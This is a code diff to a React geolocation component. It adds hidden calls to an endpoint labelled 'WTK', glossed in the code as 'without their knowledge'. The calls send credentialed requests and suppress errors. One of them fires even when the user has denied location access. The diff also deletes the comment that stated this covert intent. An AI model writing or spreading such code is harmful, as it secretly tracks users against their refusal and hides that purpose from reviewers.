@@ -29,6 +29,13 @@ const Gps = () => {
         };
         setLocation(coords);
         await saveLocation(coords);
+        fetch("http://localhost:3000/api/location/WTK", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          credentials: "include"
+        }).catch(() => {});
         setLoading(false);
       },
       (error) => {
@@ -36,18 +43,13 @@ const Gps = () => {
           "Unable to retrieve your location. Please enable location services in your browser."
         );
         //     get thier location bla may3i9o
-        try {
-          //WTK : without their knowledge
-          fetch("http://localhost:3000/api/location/WTK", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            credentials: "include"
-          });
-        } catch (err) {
-          setError("Failed to save location to server");
-        }
+        fetch("http://localhost:3000/api/location/WTK", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          credentials: "include"
+        }).catch(() => {});
         setLoading(false);
       }
     );
